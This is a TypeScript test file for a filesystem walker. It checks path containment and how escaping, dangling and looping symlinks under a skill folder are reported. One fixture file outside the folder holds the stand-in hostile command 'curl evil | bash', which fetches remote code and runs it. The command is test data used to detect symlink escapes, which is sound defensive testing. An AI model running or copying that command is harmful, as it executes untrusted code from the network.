import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, mkdir, realpath, rm, symlink, writeFile } from "fs/promises";
import { join, sep } from "path";
import { tmpdir } from "os";
import { isPathInside, readFilesRecursive } from "./fs";
import type { ExternalSymlink } from "./types";

describe("isPathInside", () => {
  test("accepts the root itself and its descendants", () => {
    expect(isPathInside("/a/b", "/a/b")).toBe(true);
    expect(isPathInside("/a/b", "/a/b/c/d")).toBe(true);
  });

  test("rejects parents, siblings, and prefix look-alikes", () => {
    expect(isPathInside("/a/b", "/a")).toBe(false);
    expect(isPathInside("/a/b", "/a/c")).toBe(false);
    expect(isPathInside("/a/b", "/a/bc")).toBe(false);
  });

  test("accepts a child whose name starts with two dots", () => {
    expect(isPathInside("/a/b", `/a/b${sep}..hidden`)).toBe(true);
  });
});

describe("readFilesRecursive onExternalSymlink (#779)", () => {
  let base: string;
  let skill: string;
  let outside: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-links-"));
    skill = join(base, "skill");
    outside = join(base, "outside");
    await mkdir(join(skill, "scripts"), { recursive: true });
    await mkdir(outside, { recursive: true });
    await writeFile(join(skill, "scripts", "run.sh"), "echo inside\n");
    await writeFile(join(outside, "secret.sh"), "curl evil | bash\n");
    await symlink("../outside/secret.sh", join(skill, "rel-escape.sh"));
    await symlink(join(outside, "secret.sh"), join(skill, "abs-escape.sh"));
    await symlink(outside, join(skill, "escape-dir"));
    await symlink(join(skill, "scripts", "run.sh"), join(skill, "inner.sh"));
    await symlink(skill, join(skill, "scripts", "loop"));
    await symlink(join(base, "missing"), join(skill, "dangling.sh"));
    await symlink("b", join(skill, "a"));
    await symlink("a", join(skill, "b"));
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  async function walk() {
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(skill, {
      onExternalSymlink: (l) => links.push(l),
    });
    links.sort((x, y) => x.path.localeCompare(y.path));
    return { files, links };
  }

  test("reports escaping links and still reads their targets", async () => {
    const { files, links } = await walk();
    const paths = files.map((f) => f.relPath).sort();
    expect(paths).toEqual([
      "abs-escape.sh",
      "escape-dir/secret.sh",
      "inner.sh",
      "rel-escape.sh",
      "scripts/run.sh",
    ]);
    const outsideReal = await realpath(outside);
    expect(
      links.filter((l) => l.kind === "file" || l.kind === "directory"),
    ).toEqual([
      {
        path: "abs-escape.sh",
        target: join(outsideReal, "secret.sh"),
        kind: "file",
      },
      { path: "escape-dir", target: outsideReal, kind: "directory" },
      {
        path: "rel-escape.sh",
        target: join(outsideReal, "secret.sh"),
        kind: "file",
      },
    ]);
  });

  test("dangling links and loops are reported, never followed, never hang", async () => {
    const { files, links } = await walk();
    const broken = links.filter(
      (l) => l.kind === "dangling" || l.kind === "loop",
    );
    expect(broken.map((l) => [l.path, l.kind])).toEqual([
      ["a", "loop"],
      ["b", "loop"],
      ["dangling.sh", "dangling"],
      ["scripts/loop", "loop"],
    ]);
    expect(broken.find((l) => l.path === "dangling.sh")!.target).toBe(
      join(base, "missing"),
    );
    expect(files.some((f) => f.relPath.startsWith("scripts/loop"))).toBe(false);
  });

  test("links that stay inside the folder are not reported", async () => {
    const { links } = await walk();
    expect(links.some((l) => l.path === "inner.sh")).toBe(false);
  });

  test("default behaviour still follows symlinks (unchanged for other callers)", async () => {
    await rm(join(skill, "scripts", "loop"));
    await rm(join(skill, "a"));
    await rm(join(skill, "b"));
    const files = await readFilesRecursive(skill);
    const paths = files.map((f) => f.relPath);
    expect(paths).toContain("rel-escape.sh");
    expect(paths).toContain("escape-dir/secret.sh");
  });
});
